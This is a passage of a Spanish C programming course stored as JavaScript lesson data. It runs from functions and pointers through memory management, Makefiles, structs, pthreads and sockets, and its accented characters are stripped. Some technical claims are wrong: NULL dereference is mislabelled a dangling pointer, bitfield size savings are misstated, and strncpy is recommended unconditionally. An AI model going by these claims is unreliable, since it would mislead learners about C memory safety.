En C Junior, cuando pasas una variable a una funcin, le pasas una **Copia**.
- Si la funcin cambia la variable, la original en el \`main\` **no cambia**.
- Para cambiar la original, necesitamos Punteros (lo veremos en la Leccin 10).

## 5. Prototipos y Herencia
C es estricto con el orden. Si escribes una funcin abajo del \`main\`, el compilador no la ver cuando intentes usarla dentro del \`main\`.
**Solucin**: Escribe solo la "firma" arriba (el Prototipo).
\`\`\`c
int sumar(int a, int b); // Prototipo: Solo aviso que existe
\`\`\`

## 6. Funciones \`inline\` (Velocidad Turbo)
Si tienes una funcin muy pequea que se llama millones de veces, puedes usar la palabra \`inline\`. El compilador, en lugar de saltar a la funcin, copiar el cdigo de la funcin directamente donde la llamas. Ms velocidad, ms espacio!

---

##  Ejercicio Tcnico
Crea una funcin llamada \`es_par\` que reciba un \`int\` y devuelva un \`int\` (1 si es par, 0 si no).

##  Regla de Oro
"Una funcin debe caber en tu pantalla. Si tienes que hacer scroll para ver dnde termina, divdela en dos".
`,completed:!1},{id:"c-junior-08",title:"Leccin 8: Arrays: Filas de Memoria Contigua",level:"junior",content:`# Leccin 8: Arrays: Filas de Memoria Contigua

## 1. La potencia de los datos agrupados
Si quieres guardar la temperatura de los 365 das del ao, no crears 365 variables. Usars un **Array** (Arreglo).

\`\`\`c
int temperaturas[7] = {20, 22, 19, 21, 23, 18, 20};
\`\`\`

## 2. Bajo el Cap: Memoria Lineal
Aqu est el secreto de C: Un array no es una lista mgica como en Python. Es un **bloque de memoria gigante** donde los datos estn uno pegado al otro.
- Si el primer dato est en la direccin \`100\`, el segundo est en la \`104\` (porque un \`int\` mide 4 bytes).
- Esta cercana hace que los arrays sean **los ms rpidos** para la CPU porque puede predecir el siguiente dato fcil.

## 3. Acceso Aleatorio (O(1))
Gracias al orden en la memoria, acceder al elemento \`99\` es igual de rpido que acceder al primero. C simplemente hace una suma: \`Direccin_Inicial + (99 * tamao_dato)\`.

## 4. El peligro de los Lmites (Buffer Overflow)
C **no revisa** si el ndice que pides existe. 
- Si tienes un array de 5 elementos y pides \`temperaturas[100]\`, C ir a esa direccin y te dar cualquier basura que encuentre ah.
- **Acceso Ilegal**: Esto es la causa nmero 1 de cierres por \`Segmentation Fault\` y de agujeros de seguridad.

## 5. Arrays Multidimensionales (Matrices)
Puedes crear tablas de datos:
\`\`\`c
int mapa[3][3] = { {1,0,1}, {0,1,0}, {1,0,1} };
\`\`\`
En la memoria RAM, esto sigue siendo una sola lnea larga. C simplemente "aplana" la matriz para que quepa en el hardware lineal.

## 6. Inicializacin Pro
Si quieres poner todo el array en ceros:
\`\`\`c
int buffer[100] = {0}; // El primero es cero, y el resto se autocompleta con ceros.
\`\`\`

---

##  Sabidura de Ingeniera
Para la computadora, \`temperaturas[3]\` es exactamente lo mismo que \`*(temperaturas + 3)\`. Los arrays y los punteros son, en esencia, la misma cosa.

##  Ejercicio
Crea un array de 10 enteros, llnalo con los nmeros del 1 al 10 usando un bucle \`for\`, e imprmelo al revs.

##  Mantra
"Un array es una fila de soldados. Si pides pasar al soldado 11 y solo hay 10, estars hablando con un fantasma".
`,completed:!1},{id:"c-junior-09",title:"Leccin 9: Strings: Cadenas de caracteres (con truco)",level:"junior",content:'# Leccin 9: Strings: Cadenas de caracteres (con truco)\n\n## 1. No existe el tipo "String" en C\nEn C, las palabras no son un tipo especial. Son simplemente **Arrays de `char`**.\n```c\nchar saludo[] = "Hola";\n```\n\n## 2. El Caracter Nulo `\\0` (El centinela)\nCmo sabe `printf` dnde termina el saludo si el array es solo una fila de letras? \nC aade automticamente un byte secreto al final: el **Nulo (`\\0`)**.\n- "Hola" tiene 4 letras, pero ocupa **5 bytes** en memoria: `H`, `o`, `l`, `a`, `\\0`.\n- **Error Fatal**: Si olvidas el nulo, las funciones de texto seguirn leyendo memoria hasta encontrar un cero por casualidad, imprimiendo basura o haciendo que el programa muera.\n\n## 3. Declaracin y Peligros\n- `char nombre[10] = "Octavio";` -> OK.\n- `char nombre[7] = "Octavio";` -> **ERROR**. No hay espacio para el `\\0`. Sobreescribirs otra parte de la memoria.\n\n## 4. Herramientas de `string.h`\nC te da una navaja suiza para el texto:\n- `strlen(s)`: Te da el largo (sin contar el nulo).\n- `strcpy(dest, orig)`: Copia texto. **Peligro!** Si `dest` es pequeo, rompers la memoria.\n- `strncpy(dest, orig, n)`: La versin pro. Solo copia hasta `n` letras. **sala siempre**.\n- `strcmp(a, b)`: Compara. Ojo: devuelve `0` si son IGUALES.\n\n## 5. Entrada de Usuario Segura\nNunca uses `gets()`. Es tan peligrosa que fue eliminada del estndar de C moderno. Usa `fgets()`:\n```c\nchar buffer[100];\nfgets(buffer, sizeof(buffer), stdin); // Lee mximo 100 letras, evitando desbordamientos.\n```\n\n## 6. ASCII: Letras que son Nmeros\nCada `char` es en realidad un nmero. \'A\' es 65. Esto significa que puedes hacer matemticas con letras: `\'A\' + 32` te dar `\'a\'`. \n\n---\n\n##  Curiosidad\nEl caracter nulo `\\0` es la razn de muchos bugs histricos. Otros lenguajes como Pascal o Rust guardan el tamao del texto en lugar de usar un centinela, pero C eligi el nulo por eficiencia en los aos 70.\n\n##  Ejercicio\nEscribe un cdigo que cuente cuntas veces aparece la letra \'a\' en un string usando un bucle `while`.\n\n##  Mantra\n"Un string en C es como una frase que termina en un punto final invisible. Si borras el punto, la frase no termina jams".\n',completed:!1},{id:"c-junior-10",title:"Leccin 10: Punteros: El Poder Real y la Memoria",level:"junior",content:`# Leccin 10: Punteros: El Poder Real y la Memoria

## 1. La direccin, no el valor
Un puntero es una variable cuyo valor es una **direccin de memoria RAM**.
- Pensa en una variable normal como una "Casa".
- Pensa en un puntero como la "Direccin" escrita en un papel.

## 2. Los dos operadores sagrados
1.  **\`&\` (Address-of)**: Obtiene la calle y el nmero de una variable.
2.  **\`*\` (Dereference)**: Te teletransporta a esa direccin para ver qu hay adentro.

\`\`\`c
int tesoro = 500;
int *mapa = &tesoro; // El mapa guarda la direccin del tesoro

printf("Mapa apunta a: %p\\n", mapa);    // Imprime algo como 0x7ffd...
printf("Contenido del tesoro: %d\\n", *mapa); // Va al tesoro y trae el 500
\`\`\`

## 3. Para qu complicarse la vida?
Sin punteros, C no podra:
- **Modificar variables en funciones**: (Paso por referencia).
- **Manejar Arrays masivos**: (Mover un puntero es ms rpido que copiar 1GB de datos).
- **Controlar Hardware**: (Los chips tienen direcciones fijas que solo accedes con punteros).

## 4. Paso por Referencia
Recuerdas que las funciones hacan copias? Con punteros, les das la direccin original:
\`\`\`c
void duplicar(int *p) {
    *p = (*p) * 2; // Entra a la direccin y cambia el valor original
}
\`\`\`

## 5. Aritmtica de Punteros (El Salto Mgico)
Si sumas \`1\` a un puntero de \`int\`, no salta 1 byte... salta **4 bytes** (lo que mide un int). El compilador es inteligente y te lleva directamente al "siguiente estante".

## 6. Punteros \`NULL\` and \`void*\`
- **\`NULL\`**: Un puntero que apunta a la "Nada". salo para inicializar y evitar que el puntero ande "suelto" por la memoria.
- **\`void*\`**: El puntero genrico. Puede apuntar a CUALQUIER tipo de dato. Es la base de las estructuras de datos avanzadas en C.

> [!WARNING]
> Intentar leer un \`*NULL\` har que el sistema operativo cierre tu programa de inmediato. Se llama **Dangling Pointer** o puntero salvaje.

---

##  El Mito de la Dificultad
Los punteros no son difciles, son **precisos**. La mayora de los lenguajes modernos (JS, Java) usan punteros todo el tiempo pero te los ocultan. En C, t ves los engranajes.

##  Ejercicio
Declara un entero, un puntero a ese entero, y cambia el valor del entero usando el puntero.

##  Mantra
"Un puntero es una flecha. Si la apuntas al lugar equivocado, herirs a tu propio programa".
`,completed:!1},{id:"c-junior-11",title:"Leccin 11: Stack vs Heap: La Batalla por la Memoria",level:"junior",content:`# Leccin 11: Stack vs Heap: La Batalla por la Memoria

## 1. El mapa mental de la RAM
Tu programa no ve la memoria como un caos. El Sistema Operativo le asigna un mapa estructurado. Los dos territorios ms importantes son el **Stack** y el **Heap**.

## 2. El Stack (La Pila): Velocidad y Orden
Imagina una pila de platos. Solo puedes poner uno arriba o quitar el de arriba.
- **Uso**: Variables locales y llamadas a funciones.
- **Gestin**: Automtica. Cuando una funcin termina, su "plato" se retira y la memoria se libera al instante.
- **Lmite**: Es pequeo (pocos MB). Si declaras un array gigante aqu, tendrs un \`Stack Overflow\`.

## 3. El Heap (El Montculo): Libertad y Caos
Un almacn gigante donde pides espacio y te dan una llave (un puntero).
- **Uso**: Datos grandes, dinmicos o que deben sobrevivir fuera de una funcin.
- **Gestin**: **Manual**. T pides la memoria con \`malloc()\` y t **debes** devolverla con \`free()\`.
- **Lmite**: Toda la RAM disponible en tu computadora.

## 4. Herramientas: \`malloc\`, \`free\` y \`sizeof\`
\`\`\`c
// Pedir espacio para 100 enteros en el Heap
int *p = malloc(100 * sizeof(int));

if (p == NULL) {
    // Si la PC no tiene RAM, malloc falla. Comprueba siempre!
    return 1;
}

// ... usar la memoria ...

free(p); // Obligatorio! Si no lo haces, tienes un Memory Leak.
\`\`\`

## 5. El peligro: Memory Leaks (Fugas de Memoria)
Si haces \`malloc\` dentro de un bucle y olvidas el \`free\`, tu programa consumir ms y ms RAM hasta que el Sistema Operativo lo mate por "glotn". En servidores que corren meses, una fuga de 1 byte puede ser fatal.

## 6. Fragmentacin
A diferencia del Stack (que siempre est ordenado), el Heap puede llenarse de "agujeros" (espacios pequeos libres entre bloques ocupados). Los programas de alto rendimiento (como los motores de videojuegos) suelen pedir un bloque gigante al inicio y gestionarlo ellos mismos para evitar esto.

---

##  Sabidura Senior
"El Stack es para el presente (ahora mismo), el Heap es para el futuro (despus de que esta funcin termine)".

##  Ejercicio
Qu pasa si intentas hacer \`free(p)\` dos veces seguidas con el mismo puntero?
(Respuesta: Se llama \`Double Free Error\` y es un fallo de seguridad grave).

##  Mantra
"Memoria pedida, memoria devuelta. S un ciudadano responsable del hardware".
`,completed:!1},{id:"c-junior-12",title:"Leccin 12: El Preprocesador: Antes de que todo empiece",level:"junior",content:`# Leccin 12: El Preprocesador: Antes de que todo empiece

## 1. El editor de texto automtico
Antes de compilar, C corre un programa llamado **Preprocesador**. Busca todas las lneas que empiezan con \`#\`.

## 2. \`#define\`: El buscar y reemplazar
Puedes crear "Apodos" para valores:
\`\`\`c
#define PI 3.1415
#define MAX_USUARIOS 100
\`\`\`
El preprocesador simplemente buscar la palabra \`PI\` en todo tu cdigo y la cambiar por \`3.1415\` antes de que el compilador lo lea. No ocupa memoria RAM!

## 3. \`#include\`: Copiar y pegar
Ya lo conoces. Copia todo el contenido de un archivo (como \`stdio.h\`) y lo pega al inicio de tu cdigo.

## 4. Header Guards
Para evitar que un archivo se incluya dos veces (lo que dara error), usamos un truco clsico:
\`\`\`c
#ifndef MI_REGLA
#define MI_REGLA
// Cdigo
#endif
\`\`\`
Esto es estndar en todos los archivos de cabecera (\`.h\`).

---

##  Pro-Tip
Usa \`#define\` para valores que no van a cambiar nunca. Es ms rpido y hace que tu cdigo sea ms fcil de leer.
`,completed:!1},{id:"c-junior-13",title:"Leccin 13: Makefile: El Director de Orquesta",level:"junior",content:`# Leccin 13: Makefile: El Director de Orquesta

## 1. El problema del xito
Cuando tienes un proyecto real (digamos, 50 archivos \`.c\`), escribir \`gcc file1.c file2.c ...\` cada vez es imposible. Adems, si cambias un solo punto y coma en el archivo 49, no quieres volver a compilar los otros 48!

## 2. Qu es \`make\`?
Es una herramienta de automatizacin que lee un archivo de texto llamado **Makefile**. Su inteligencia reside en mirar la "fecha de modificacin". Si tu archivo \`.o\` es ms nuevo que tu \`.c\`, \`make\` sabe que no hay nada que hacer.

## 3. Anatoma de una Regla
\`\`\`makefile
objetivo: dependencias
	comando
\`\`\`
> [!IMPORTANT]
> El comando **debe** estar precedido por un **TABULADOR**. Si usas espacios, \`make\` fallar. Es una de las reglas ms curiosas y frustrantes de la informtica.

## 4. Un Makefile Realista
\`\`\`makefile
CC = gcc
CFLAGS = -Wall -Wextra -g

app: main.o utils.o
	$(CC) main.o utils.o -o app

main.o: main.c
	$(CC) $(CFLAGS) -c main.c

clean:
	rm -f *.o app
\`\`\`

## 5. Flags de Ingeniera (\`CFLAGS\`)
- \`-Wall\`: Muestra todas las advertencias. (Un pro nunca ignora un warning).
- \`-Wextra\`: Versin "estricta" de las advertencias.
- \`-g\`: Incluye informacin para debugear con GDB (veremos esto ms adelante).
- \`-O2\` o \`-O3\`: Le dice al compilador: "Activa todas tus optimizaciones matemticas".

## 6. Variables Automticas
- \`$@\`: El nombre del objetivo.
- \`$^ \`: Todas las dependencias.
Hacen que tus Makefiles sean cortos y elegantes!

---

##  Historia
\`make\` fue creado por Stuart Feldman en 1976 despus de pasar una tarde entera debugeando un programa porque se olvid de compilar un archivo que haba cambiado. "Hagmoslo automtico", pens.

##  Ejercicio
Si tienes un proyecto con \`math.c\`, \`math.h\` y \`main.c\`, escribe una regla simple en un Makefile para compilarlos.

##  Fin de Junior
Felicidades! Has cruzado el ecuador de C. Sabes cmo se pide memoria, cmo se automatiza la construccin y cmo funciona el preprocesador. Ahora pasamos a **Semi-Senior**, donde dejaremos de "escribir cdigo" para empezar a "disear sistemas".
`,completed:!1},{id:"c-ss-14",title:"Leccin 14: Punteros Avanzados y Doble Indireccin",level:"semi-senior",content:'# Leccin 14: Punteros Avanzados y Doble Indireccin\n\n## 1. El Salto de Nivel: El Puntero al Puntero\nSi un puntero es la direccin de una casa, un **Puntero al Puntero (`**p`)** es la direccin de un papel que contiene la direccin de la casa. \n\nEn el nivel Semi-Senior, esto es vital para:\n1.  **Modificar un puntero desde una funcin**: Si pasas `int *p` a una funcin, sta puede cambiar el dato, pero NO puede hacer que `p` apunte a otra direccin (porque `p` es una copia). Para cambiar a dnde apunta `p`, necesitas pasarle `&p` (un `int **`).\n\n## 2. Arrays Dinmicos de Strings\nUn string es un `char*`. Un array de strings es un array de direcciones, es decir: `char **`.\n```c\nchar **lista = malloc(3 * sizeof(char*));\nlista[0] = strdup("Hola");\nlista[1] = strdup("Mundo");\n```\n\n## 3. Punteros y Constantes: El Laberinto de `const`\nEs fundamental para la seguridad del software saber dnde poner el `const`:\n- `const int *p`: El **dato** es intocable. Puedes mover el puntero a otra casa, pero no puedes remodelar la casa actual.\n- `int * const p`: El **puntero** es intocable. Ests atrapado en esa casa para siempre, pero puedes remodelarla todo lo que quieras.\n- `const int * const p`: Nada se mueve, nada cambia. Mxima seguridad.\n\n## 4. Aritmtica Dinmica\nCuando haces `ptr++`, el procesador ejecuta una instruccin de suma, pero el valor depende del tipo.\n- Si es `char*`, suma 1.\n- Si es `double*`, suma 8.\nEsto permite recorrer arrays de estructuras gigantes con la misma velocidad que un array de letras.\n\n## 5. El Puntero `void*` y el Casting\nEl `void*` es el "comodn". No tiene tipo. Es lo que devuelve `malloc`. Para usarlo, debes decirle a C qu hay ah (**Cast**):\n```c\nvoid *gen = malloc(4);\nint *especifico = (int*)gen; // Ahora C sabe que son 4 bytes de un entero.\n```\n\n---\n\n##  Sabidura de Arquitecto\n"La indireccin es la solucin a todos los problemas en computacin, excepto el problema de tener demasiada indireccin".\n\n##  Ejercicio\nDeclara un puntero a puntero de entero y salo para cambiar el valor de una variable `x` a travs de dos niveles de "papelitos con direcciones".\n\n##  Mantra\n"Si puedes visualizar la flecha en la memoria, puedes dominar los punteros".\n',completed:!1},{id:"c-ss-15",title:"Leccin 15: Structs, Padding y Memory Alignment",level:"semi-senior",content:`# Leccin 15: Structs, Padding y Memory Alignment

## 1. Structs: El Alma de los Datos
C no tiene clases. Tiene \`struct\`. Es la forma de empaquetar datos heterogneos bajo un solo nombre.

## 2. Memory Padding: El Espacio Invisible
Aqu es donde C se separa de los lenguajes de alto nivel.
Si tienes este struct:
\`\`\`c
struct Ejemplo {
    char a;   // 1 byte
    int b;    // 4 bytes
} data;
\`\`\`
Podras pensar que \`sizeof(data)\` es 5. **ERROR. Es 8.**
- **Por qu?**: La CPU lee la memoria en bloques (palabras) de 4 u 8 bytes. Si el \`int\` empezara en la direccin 1, la CPU tendra que hacer dos lecturas para obtenerlo. 
- **Solucin**: El compilador inserta 3 bytes de "basura" (Padding) entre \`a\` y \`b\` para que \`b\` est alineado.

## 3. Optimizacin: El Tetris de Variables
Puedes ahorrar memoria solo cambiando el orden:
\`\`\`c
// MAL (Ocupa 12 bytes por el padding)
struct Mal { char c; int i; char c2; };

// BIEN (Ocupa 8 bytes, los dos char se guardan juntos)
struct Bien { int i; char c; char c2; };
\`\`\`
> [!TIP]
> **Regla de Oro**: Ordena tus variables dentro del struct de mayor a menor tamao (Punteros/Doubles -> Ints -> Shorts -> Chars).

## 4. Bit-fields: Ahorro de Nivel Espacial
A veces necesitas guardar un valor que solo va de 0 a 7 (3 bits). En lugar de gastar un \`int\` (32 bits), puedes decirle a C:
\`\`\`c
struct Flags {
    unsigned int activo : 1; // Solo usa 1 bit
    unsigned int modo   : 3; // Solo usa 3 bits
};
\`\`\`
Esto es vital para programar hardware (chips) donde cada bit cuenta.

## 5. Structs Autoreferenciados
Un struct puede contener un puntero a otro struct de su mismo tipo.
\`\`\`c
struct Nodo {
    int dato;
    struct Nodo *siguiente;
};
\`\`\`
Esta es la base de las **Listas Enlazadas**, Pilas y Colas. Sin esto, no existiran las bases de datos modernas.

---

##  El Mito del "Objeto"
Un "Objeto" en C++ o Java es, por debajo, simplemente un \`struct\` con punteros a funciones. Al entender los structs, entiendes cmo funcionan los objetos en cualquier lenguaje.

##  Ejercicio
Crea un struct \`Persona\` con nombre (string) y edad (int). Calcula su tamao con \`sizeof\` y ve si hay padding.

##  Mantra
"Alinea tus datos y tu CPU te lo agradecer con velocidad".
`,completed:!1},{id:"c-ss-16",title:"Leccin 16: Unions y Bitfields: Ahorro Extremo de Memoria",level:"semi-senior",content:`# Leccin 16: Unions y Bitfields: Ahorro Extremo de Memoria

## 1. Unions: El Transformista de la Memoria
Una \`union\` se define igual que un struct, pero con una diferencia fsica radical: **todos sus miembros comparten la misma direccin de memoria**. El tamao de la union es el tamao de su miembro ms grande.

Para qu sirve esto? Principalmente para:
- **Ahorrar espacio**: Si tienes una estructura que puede ser un Gato O un Perro (pero nunca ambos a la vez), una union ahorra la mitad de la RAM.
- **Type Punning**: Ver el mismo dato de diferentes formas.

\`\`\`c
union Convertidor {
    float f;
    unsigned char bytes[4];
};
\`\`\`
Si pones un nmero en \`f\`, puedes leer \`bytes[0]\` para ver cmo se guarda ese float bit a bit en la memoria. Es la base de la ingeniera inversa.

## 2. Bitfields: Hablando con el Hardware
Imagina que ests programando un chip con solo 1KB de RAM. No puedes gastar 4 bytes (\`int\`) para guardar un simple estado de "Encendido/Apagado".
\`\`\`c
struct RegistroControl {
    unsigned int habilitado  : 1; // 1 bit
    unsigned int error       : 1; // 1 bit
    unsigned int modo        : 2; // 2 bits (valores 0-3)
    unsigned int reservado   : 4; // 4 bits
};
\`\`\`
Este struct ocupa **1 solo byte** en lugar de 32 bytes si usaras ints normales. C es el nico lenguaje popular que te permite este nivel de control quirrgico sobre los bits.

## 3. El peligro de la "Endianness"
Cuando juegas con uniones y bytes, debes saber que algunas CPUs (Intel) guardan los nmeros "al revs" (Little Endian) y otras (ARM antiguas, Redes) los guardan "derecho" (Big Endian).
**Tip Senior**: Si tu programa en C funciona en tu PC pero falla cuando lo envas por internet, probablemente sea un problema de Endianness!

---

##  Historia
Las uniones eran vitales en los aos 80 cuando 640KB de RAM era "suficiente para cualquiera". Hoy se usan en drivers de video, protocolos de red y kernels.

##  Ejercicio
Crea una \`union\` que permita ver un \`int\` como dos \`short\`.

##  Mantra
"La memoria es un lienzo. Con las uniones, aprendes a mirar el lienzo desde diferentes ngulos".
`,completed:!1},{id:"c-ss-17",title:"Leccin 17: Gestin de Memoria Dinmica: Realloc y Calloc",level:"semi-senior",content:`# Leccin 17: Gestin de Memoria Dinmica: Realloc y Calloc

## 1. Ms all de \`malloc\`
Ya sabes pedir memoria. Ahora aprenderemos a gestionarla como un ingeniero de sistemas.

### \`calloc\`: La Limpieza por Defecto
A diferencia de \`malloc\`, \`calloc\` hace dos cosas:
1.  Multiplica el nmero de elementos por el tamao (ej: \`calloc(10, sizeof(int))\`).
2.  **Limpia la memoria**: Pone todos los bits en cero.
**Cundo usarla**: Siempre que no quieras lidiar con "basura" en tus arrays iniciales. Es un poco ms lenta que malloc, pero mucho ms segura.

### \`realloc\`: La Memoria Elstica
Pediste espacio para 10 usuarios pero ahora llegaron 20? No borres todo. Usa \`realloc\`.
\`\`\`c
int *nuevo_p = realloc(p, 20 * sizeof(int));
\`\`\`
**Qu pasa por dentro**:
1.  Si hay espacio libre "al lado" del bloque actual, la CPU simplemente estira la frontera.
2.  Si no hay espacio, busca una "casa" nueva ms grande, **copia todos tus datos** automticamente y libera la casa vieja.

> [!CAUTION]
> **Error de Novato**: \`p = realloc(p, 100);\`. Si \`realloc\` falla (no hay RAM), devuelve \`NULL\`. Al asignarlo directamente a \`p\`, perdiste la direccin del bloque original y creaste una fuga de memoria! Usa siempre un puntero temporal.

## 2. Fragmentacin: El Cncer de la RAM
Si pides y liberas miles de bloques pequeos, el Heap se ver como un queso suizo. Tendrs mucha RAM libre, pero ningn bloque ser **contiguo** (pegado).
- **Consecuencia**: Un \`malloc\` grande fallar aunque tengas gigas libres.
- **Solucin Profesional**: Usa "Memory Pools" o pide bloques grandes y gestinalos t.

## 3. Herramientas de Diagnstico
Un profesional de C no confa en su suerte. Usa **Valgrind**.
- Ejecuta: \`valgrind --leak-check=full ./mi_programa\`.
- Te dir exactamente en qu lnea pediste memoria que no liberaste. "Si no pasa Valgrind, no est terminado".

---

##  Sabidura
"Gestionar memoria manualmente es como volar un avin sin piloto automtico. Es agotador, pero te permite hacer maniobras que ningn otro lenguaje puede".

##  Ejercicio
Escribe un cdigo que pida 5 enteros con \`malloc\`, luego use \`realloc\` para que quepan 10, y finalmente libere todo.

##  Mantra
"La memoria no es infinita. Trtala con respeto y ella tratar bien a tu programa".
`,completed:!1},{id:"c-ss-18",title:"Leccin 18: Function Pointers: Callbacks y Polimorfismo",level:"semi-senior",content:`# Leccin 18: Function Pointers: Callbacks y Polimorfismo

## 1. Las funciones tambin viven en la RAM
Al igual que las variables, el cdigo de tus funciones est cargado en la memoria (en el segmento \`TEXT\`). Esto significa que tienen una **direccin de memoria**.

## 2. Para qu apuntar a una funcin?
Imagina que ests escribiendo una librera para ordenar listas. Cmo sabes si el usuario quiere ordenar de mayor a menor, o por orden alfabtico?
**Respuesta**: Le pides al usuario que te mande una funcin que compare dos elementos. Esto se llama **Callback**.

## 3. Sintaxis (El terror de los estudiantes)
La sintaxis de punteros a funciones es famosa por ser confusa. 
\`\`\`c
// Un puntero llamado 'operacion' que apunta a funciones que 
// devuelven int y reciben dos int.
int (*operacion)(int, int);

operacion = sumar;    // Apuntamos a la funcin sumar
int r = operacion(5,5); // Ejecutamos
\`\`\`

## 4. \`qsort\`: El ejemplo real de la Librera Estndar
C tiene una funcin para ordenar cualquier cosa: \`qsort\`. Recibe un puntero a funcin:
\`\`\`c
int comparar(const void *a, const void *b) {
    return (*(int*)a - *(int*)b);
}
qsort(mi_array, 10, sizeof(int), comparar);
\`\`\`
Gracias a este puntero, \`qsort\` puede ordenar nmeros, letras, structs o naves espaciales sin cambiar ni una lnea de su propio cdigo.

## 5. Polimorfismo en C
Aunque C no tiene Clases, puedes crear una "V-Table" (Virtual Table):
\`\`\`c
struct Enemigo {
    void (*atacar)(void);
};
\`\`\`
Puedes tener un array de enemigos y llamar a \`enemigos[i].atacar()\`. Si el enemigo es un Dragn, lanzar fuego. Si es un Orco, usar un hacha. Has implementado Programacin Orientada a Objetos en C puro!

---

##  Historia
Los punteros a funciones son los padres de los "eventos" en JS y los "delegates" en C#. Al dominarlos, entiendes cmo funciona el despacho dinmico en cualquier lenguaje moderno.

##  Ejercicio
Crea dos funciones: \`min\` y \`max\`. Crea un puntero a funcin que apunte a una u otra segn lo que elija el usuario.

##  Mantra
"Una funcin es solo una direccin con permiso de ejecucin".
`,completed:!1},{id:"c-ss-19",title:"Leccin 19: Librerias Estticas y Dinmicas (Shared Objects)",level:"semi-senior",content:`# Leccin 19: Librerias Estticas y Dinmicas (Shared Objects)

## 1. No reinventes la rueda
Programar profesionalmente en C significa saber usar y crear Librerias (libraries).

## 2. Librerias Estticas (\`.a\` / \`.lib\`)
- **Cmo funcionan**: Durante la compilacin, el \`Linker\` copia el cdigo de la librera y lo pega dentro de tu ejecutable.
- **Ventaja**: Tu programa es "un solo archivo". No depende de nada externo para correr. Es ms rpido de cargar.
- **Desventaja**: El ejecutable es ms pesado. Si actualizas la librera, tienes que volver a compilar tu programa.

## 3. Librerias Dinmicas (\`.so\` / \`.dll\`)
- **Cmo funcionan**: Tu ejecutable no tiene el cdigo, solo tiene una "etiqueta" que dice: *"Cuando arranques, busca este cdigo en el disco"*.
- **Ventaja**: El ejecutable es minsculo. Varios programas pueden compartir la misma librera en la RAM al mismo tiempo, ahorrando gigas de memoria en el sistema.
- **Desventaja**: El famoso "DLL Hell". Si el usuario borra o cambia la versin del \`.so\`, tu programa dejar de funcionar.

## 4. El proceso de Creacin
Para crear una librera, compilas tus archivos \`.c\` a objetos \`.o\`, y luego usas herramientas especiales:
- Para estticas: \`ar rcs libmylib.a file1.o file2.o\`
- Para dinmicas: \`gcc -shared -o libmylib.so file1.o file2.o\`

## 5. Carga Dinmica con \`dlopen\`
Los programas avanzados (como Photoshop con sus plugins) no cargan todas las libreras al inicio. Las cargan **mientras corren** usando \`dlopen()\`. Esto permite que el programa crezca sin cerrarse.

---

##  Sabidura de Arquitecto
"Una buena biblioteca es aquella que hace una cosa tan bien, que el programador olvida que existe un mundo fuera de ella".

##  Ejercicio
Si ests en Linux/macOS, corre \`ldd /bin/bash\`. Vers todas las Librerias dinmicas que el terminal necesita para simplemente existir.

##  Mantra
"Escribe cdigo para hoy, pero disea Librerias para siempre".
`,completed:!1},{id:"c-ss-20",title:"Leccin 20: El Estndar C: De K&R a C23",level:"semi-senior",content:`# Leccin 20: El Estndar C: De K&R a C23

- **C11 / C17:** Mejoras de seguridad y soporte para procesadores multi-ncleo.
- **C23:** La versin ms moderna. Trae mejoras increbles como el chequeo de lmites y soporte mejorado para hardware moderno.

## 2. Qu versin usar?
Para proyectos nuevos, intenta usar al menos **C11**. Ofrece un equilibrio perfecto entre compatibilidad y seguridad moderna.

---

##  Fin de Semi-Senior
Has dominado el hardware, la memoria alignment y los punteros a funciones. Ya no eres un novato; eres un desarrollador capaz de entender cmo respira el software. Preprate para el nivel **Senior**, donde entraremos en la concurrencia, las redes y la optimizacin de bajo nivel.
`,completed:!1},{id:"c-senior-21",title:"Leccin 21: Multithreading con Pthreads y Concurrencia",level:"senior",content:`# Leccin 21: Multithreading con Pthreads y Concurrencia

## 1. Del Monociclo al Ferrari Multicapa
Hasta ahora, tus programas eran "Single Threaded": una lnea tras otra. Pero tu CPU tiene 8, 16 o ms ncleos. No usarlos es desperdiciar potencia.
**Un Hilo (Thread)** es una unidad de ejecucin que comparte la misma memoria que el programa principal.

## 2. Pthreads: El Estndar POSIX
En Linux y macOS usamos la librera \`<pthread.h>\`.
\`\`\`c
pthread_t hilo;
pthread_create(&hilo, NULL, mi_funcion, NULL);
pthread_join(hilo, NULL); // Esperar a que termine
\`\`\`

## 3. La pesadilla: Race Conditions
Cuando dos hilos intentan cambiar la misma variable (\`x++\`) al mismo tiempo:
1.  El Hilo A lee el valor (10).
2.  El Hilo B lee el valor (10).
3.  El Hilo A escribe (11).
4.  El Hilo B escribe (11).
**Resultado**: Hicimos dos incrementos pero el resultado es 11. Has perdido datos y tu programa tiene un bug fantasma!

## 4. Mutex: El "Token" de Seguridad
Para evitar esto usamos un **Mutex** (Mutual Exclusion).
- Un hilo "cierra con llave" (lock) la variable.
- Hace su trabajo.
- "Abre" (unlock) la variable.
Los otros hilos se quedan esperando en la puerta. Es lento, pero seguro.

## 5. Deadlocks: El Callejn sin Salida
Si el Hilo A espera al Hilo B, y el Hilo B espera al Hilo A, el programa se congela para siempre. Disear sistemas multihilo sin deadlocks es lo que separa a un Senior de un Arquitecto.

## 6. Atmicos (Atomic Operations)
En C11, existen variables especiales que no necesitan Mutex porque la propia CPU garantiza que la operacin de suma se haga en un solo paso indivisible. Es la forma ms rpida de contar en multihilo!

---

##  Sabidura Senior
"Lanzar hilos es fcil. Sincronizarlos correctamente es lo ms difcil que hars en tu carrera".

##  Ejercicio
Intenta crear un programa que lance 5 hilos y que cada uno imprima su propio ID. Salen en orden? (Respuesta: No, el orden es impredecible y depende del Sistema Operativo).

##  Mantra
"Si no hay un Mutex protegiendo tu variable compartida, tu programa est roto aunque todava no lo sepas".
`,completed:!1},{id:"c-senior-22",title:"Leccin 22: Sockets API: El Lenguaje de la Red",level:"senior",content:`# Leccin 22: Sockets API: El Lenguaje de la Red

## 1. El Socket: El Telfono de C
En el mundo de los sistemas operativos (Unix/Linux), **todo es un archivo**. Un socket es simplemente un "archivo especial" que en lugar de escribir en el disco, escribe en una tarjeta de red.

## 2. El Baile de la Conexin (TCP)
Para que dos computadoras se hablen, hay un ritual obligatorio (API de Sockets):

### Lado del Servidor:
1.  **\`socket()\`**: Crea el telfono.
2.  **\`bind()\`**: Le asigna un nmero (Puerto, ej: 8080).
3.  **\`listen()\`**: Se queda esperando a que el telfono suene.
4.  **\`accept()\`**: Atiende la llamada. Crea un nuevo socket solo para este cliente.

### Lado del Cliente:
1.  **\`socket()\`**: Crea su propio telfono.
2.  **\`connect()\`**: Llama al nmero del servidor.

## 3. Serializacin: El lenguaje universal
No puedes enviar un \`struct\` de C por el cable y esperar que una app en Python lo entienda directamente.
- Los bytes pueden estar en diferente orden (Endianness).
